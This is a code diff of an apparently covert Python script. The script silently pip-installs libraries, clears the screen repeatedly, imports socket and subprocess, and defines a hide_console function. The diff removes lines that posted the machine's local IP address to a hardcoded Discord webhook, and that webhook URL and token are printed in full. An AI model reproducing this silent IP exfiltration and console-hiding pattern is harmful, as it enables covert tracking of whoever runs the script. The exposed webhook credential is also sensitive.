@@ -14,15 +14,14 @@ libraries = [
 
 for library in libraries:
     try:
-        import library
-
+        __import__(library)
         os.system("cls")
         print(f"{library} is installed")
         os.system("cls")
     except ImportError:
         os.system(f"pip install {library}")
+        os.system("cls")
 os.system("cls")
-
 import socket
 import sys
 import subprocess
@@ -44,12 +43,6 @@ def get_local_ip():
         print(f"Error occurred: {e}")
     finally:
         s.close()
-
-
-webhook_url = "https://discord.com/api/webhooks/1176823246813921291/OZOpPEGpnXdagLnnq8Bqwk-lg5cKmYflrZgj4XrBmpDpUQZ8j_nAqMCXOvS2Puh87SKm"
-message_content = get_local_ip()
-data = {"content": message_content}
-r = requests.post(webhook_url, json=data)
 
 
 def hide_console():
